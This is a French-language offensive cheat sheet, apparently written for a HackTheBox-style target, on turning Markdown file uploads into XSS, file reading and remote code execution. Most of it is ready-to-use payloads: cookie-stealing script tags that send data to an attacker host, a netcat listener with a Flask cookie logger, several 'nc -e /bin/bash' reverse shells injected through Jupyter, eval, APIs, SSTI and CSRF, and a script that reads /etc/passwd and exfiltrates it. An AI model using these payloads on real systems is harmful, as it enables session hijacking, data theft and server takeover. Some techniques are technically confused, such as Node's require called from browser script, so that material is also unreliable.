# Exécuter le XSS avec les fichiers au format .md


Lors du téléchargement d'un fichier qui peut être traité par le serveur au format HTML, nous devons garder à l'esprit que tout ce qui est traité en HTML est probablement vulnérable à XSS (exécution de javascript).

Le fichier markdown est un fichier d'usage courant principalement dans github avec l'extension ".md" (README) dont le but est de décrire un procéssus, une installation etc... une fois ce fichier soumis au serveur, certains serveurs peuvent procéder comme du HTML avant de le stocker. Là, nous pouvons effectuer du XSS comme suit :



📜 Exploit 1️⃣ : XSS avec Markdown → RCE via JavaScript

Si le serveur convertit le Markdown en HTML mais ne filtre pas les balises <script>, on peut injecter du JS malveillant :

# Test d'Injection XSS
<script>
    fetch("http://ton-serveur.com/steal?cookie=" + document.cookie);
</script>

➡️ Impact : Récupération des cookies de session, potentiellement utilisables pour hijacker une session.



📜Exploit 2️⃣ : Injection de code dans un Notebook Jupyter

Si le Markdown est utilisé dans Jupyter Notebook, tu peux exécuter du Python directement :

```python
import os
os.system("nc -e /bin/bash TON_IP TON_PORT")

➡️ **Impact :** Remote Code Execution (RCE) si le serveur exécute le Markdown dans un environnement Jupyter.  

---

### **📜 Exploit 3️⃣ : Inclusion de fichiers (`LFI`)**
Si le serveur permet d'inclure du Markdown à partir d'un chemin local, tu peux essayer ceci :

```markdown
![LFI Test](file:///etc/passwd)

➡️ Impact : Lecture de fichiers système sensibles. Si combiné avec RCE, on peut exécuter du code.


📜 Exploit 4️⃣ : Injection Bash via Markdown dans un CMS

Si le serveur exécute des commandes Markdown dans un CMS comme Ghost, certains supports comme Mermaid.js permettent d’exécuter du JavaScript :

```mermaid
graph TD;
A[Click Me] -->|XSS| B("alert('Hacked!')");

➡️ **Impact :** Possibilité de RCE si le serveur exécute du JavaScript malveillant.  

---






📜 Exploit : XSS pour exfiltrer les cookies

Crée un fichier exploit.md avec le contenu suivant :

# Exploit XSS - Vol de Cookies

<script>
  fetch("http://TON_IP:TON_PORT/cookie?data=" + document.cookie);
</script>

🔹 Étapes d'exploitation :

1️⃣ Lancer un serveur d'écoute sur ta machine pour capturer les cookies :

nc -lvnp 9001

2️⃣ Héberger exploit.md sur la cible et le faire afficher dans un navigateur.

3️⃣ Si le XSS fonctionne, le navigateur de la victime exécutera le script et enverra les cookies sur ta machine.

4️⃣ Les cookies s’affichent dans ton Netcat.
🔹 Améliorations possibles :

    Utiliser une requête AJAX invisible pour envoyer les cookies sans alerter l’utilisateur :

<script>
  var i = new Image();
  i.src = "http://TON_IP:TON_PORT/cookie?data=" + document.cookie;
</script>

    Créer un serveur Flask pour loguer les cookies :

from flask import Flask, request

app = Flask(__name__)

@app.route('/cookie')
def log_cookie():
    cookie = request.args.get('data')
    print(f"Cookie volé : {cookie}")
    return '', 204  # Réponse vide

app.run(host='0.0.0.0', port=9001)








🔥 Méthodes pour obtenir un reverse shell via XSS
1️⃣ Si la cible utilise eval() en JavaScript (Exécution locale)

Si l'application exécute du JS avec eval(), tu peux injecter un reverse shell via WebSockets ou fetch :

<script>
eval(require('child_process').execSync('nc -e /bin/bash TON_IP TON_PORT'));
</script>

📌 Problème : Peu de serveurs utilisent eval() dans du JS exécuté côté serveur.
2️⃣ Exploiter une API REST vulnérable

Si l'application fait des requêtes vers une API qui exécute des commandes, tu peux envoyer une requête malveillante avec XSS :

<script>
fetch("http://alert.htb/api/run?cmd=nc -e /bin/bash TON_IP TON_PORT");
</script>

📌 Utile si l’application a une fonctionnalité "Exécuter une commande"
3️⃣ Si le serveur utilise Node.js avec une vulnérabilité dans res.send()

Si l'application tourne sur Node.js et expose des routes vulnérables, essaie :

<script>
fetch("http://alert.htb/admin?name='+require('child_process').exec('nc -e /bin/bash TON_IP TON_PORT')+'");
</script>

📌 Exploitable si le serveur construit dynamiquement des réponses HTML avec des entrées non filtrées.
4️⃣ Transformer l’XSS en SSTI (Server-Side Template Injection)

Si l’application utilise Jinja2, Twig, ou EJS, tu peux injecter une RCE via SSTI :

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("nc -e /bin/bash TON_IP TON_PORT") }}

📌 À tester si l’XSS peut être inséré dans une page qui utilise un moteur de template.
5️⃣ Exploiter un administrateur connecté (CSRF + XSS)

Si un admin est connecté, tu peux utiliser l'XSS pour lui faire exécuter un script qui déclenche une RCE sur le serveur via une page vulnérable :

<script>
fetch("http://alert.htb/admin/run?cmd=nc -e /bin/bash TON_IP TON_PORT", { credentials: "include" });
</script>

📌 Fonctionne si l’admin a plus de privilèges et que l'application a une page de gestion de commandes.




<script>
    var url = "messages.php?file=../../../../../../../etc/passwd"
    var attacker = "http://<your-ip-address>:4444/exfil"
    var xhr = new XMLHttpRequest()
    xhr.onreadystatechange = function () {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
      }
    }
    xhr.open("GET", url, true)
    xhr.send(null)
</script>

